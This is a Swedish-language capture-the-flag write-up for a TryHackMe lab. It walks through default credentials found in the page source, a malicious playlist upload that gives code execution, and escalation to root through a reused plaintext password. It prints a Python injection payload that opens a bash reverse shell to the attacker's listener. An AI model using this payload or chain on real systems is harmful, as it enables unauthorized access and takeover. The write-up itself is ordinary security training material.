# Beach Bar

![Screenshot](img/Pasted%20image%2020260821105306.png)

https://tryhackme.com/room/hh-beachbar-d849f7f7
## Introduction
> Welcome back to the Byte Lotus — this time the sand is warm, the deck lights are coming up, and the beach bar's jukebox takes requests from anyone with a phone. You spend the evening as a guest at the rail who simply notices things: a DJ who never logs out, a song queue that accepts a little more than song titles, a service down the boardwalk quietly announcing "something".

> The beachside guest-experience build shipped on a deadline, and the night-shift developer wired the jukebox straight into the floor with the trimmings still attached.

![Screenshot](img/Pasted%20image%2020260821105424.png)
## Initial Recon

Port 80 är öppen

![Screenshot](img/Pasted%20image%2020260821112912.png)

Sajten levererar ett inloggningsformulär

![Screenshot](img/Pasted%20image%2020260821110611.png)

Kollade source och såg en kommentar som lyste över hela skärmen

![Screenshot](img/Pasted%20image%2020260821110857.png)

`dj:dj` alltså, trevligt.

Väl inloggad ser det ut så här:

![Screenshot](img/Pasted%20image%2020260821110952.png)

Vi kan alltså ladda ner spellistan, redigera den och ladda upp igen. Vad sägs om att redigera den på ett sätt som ger oss access till servern? Borde gå.

Spellistan ser ut så här:

![Screenshot](img/Pasted%20image%2020260821111248.png)

Valde att ladda upp samma lista igen bara för att se vad som händer:

![Screenshot](img/Pasted%20image%2020260821111500.png)

Kan man ladda upp en fil som inte är `.yml`?

Textfiler går bra, men inte t.ex. `jpg`

![Screenshot](img/Pasted%20image%2020260821112747.png)

Kanske ladda upp nåt script som kör i browsern?

En POC visar att vi kan läsa ut filer:

![Screenshot](img/Pasted%20image%2020260821113431.png)

![Screenshot](img/Pasted%20image%2020260821113443.png)

whoami säger att vi är `bartender` och i hemkatalogen hittas flaggan:

<details>
  <summary><b>Klicka här för att se flaggan</b></summary>

   ![Screenshot](img/Pasted%20image%2020260821113708.png)
</details>

## Eskalering
Gjort lite småtester - det går att skapa filer i hemkatalogen (med `touch` eller `echo` till fil). Så, det borde vara möjligt att ordna ett reverse shell? 

Startade en lyssnare på min maskin med `nc`, därefter skickade jag in följande i formuläret:

`"__import__('os').popen('bash -c \"bash -i >& /dev/tcp/192.168.x.x/4444 0>&1\"').read()"`

Och fick en anslutning

![Screenshot](img/Pasted%20image%2020260821121007.png)

Uppgraderade mitt shell och efter att ha letat runt på systemet hittades en intressant fil, `jukeboxd.py`

![Screenshot](img/Pasted%20image%2020260821124002.png)

Den vill ha ett `stream-pass` för att kunna köra, ett lösenord som jag sprang över i en annan sökning:

![Screenshot](img/Pasted%20image%2020260821124104.png)

Där ser man lösenordet i klartext, nämligen `SunsetSpritz2024!`.

Testade att köra `sudo -l` för bartender, men det var fel lösenord. Letade vidare på filsystemet, sen slog det mig, funkar lösenordet med `su root`?

Svaret är ja :D

<details>
  <summary><b>Klicka här för att se flaggan</b></summary>

   ![Screenshot](img/Pasted%20image%2020260821123708.png)
</details>





